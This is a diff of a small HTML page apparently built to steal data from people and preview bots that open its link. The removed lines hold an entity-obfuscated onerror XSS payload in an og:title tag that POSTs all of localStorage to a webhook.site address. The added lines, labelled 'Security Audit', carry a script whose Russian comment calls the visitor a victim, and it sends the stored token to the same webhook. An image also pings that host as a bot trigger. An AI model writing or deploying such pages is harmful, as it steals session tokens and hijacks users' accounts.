@@ -1,8 +1,14 @@
 <!DOCTYPE html>
 <html>
 <head>
-<meta property="og:title" content='"><img src=x &#111;n&#101;rror="&#102;etch(`https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6`,{method:`POST`,body:JSON.stringify(localStorage)})">'></head>
+    <meta property="og:title" content="Security Audit">
+    <meta property="og:description" content="Checking bot headers">
+    <script>
+        // Это для случая, если ссылку откроет реальный юзер (жертва)
+        fetch('https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?token=' + btoa(localStorage.getItem('token') || 'no_ls'));
+    </script>
+</head>
 <body>
-  <h1>Site isуычквсеамнпигртшо actщшощшive</h1>
+    <img src="https://webhook.site/c8ce1351-d58c-41cc-a576-f8f0c4ed50d6?v=bot_trigger">
 </body>
 </html>
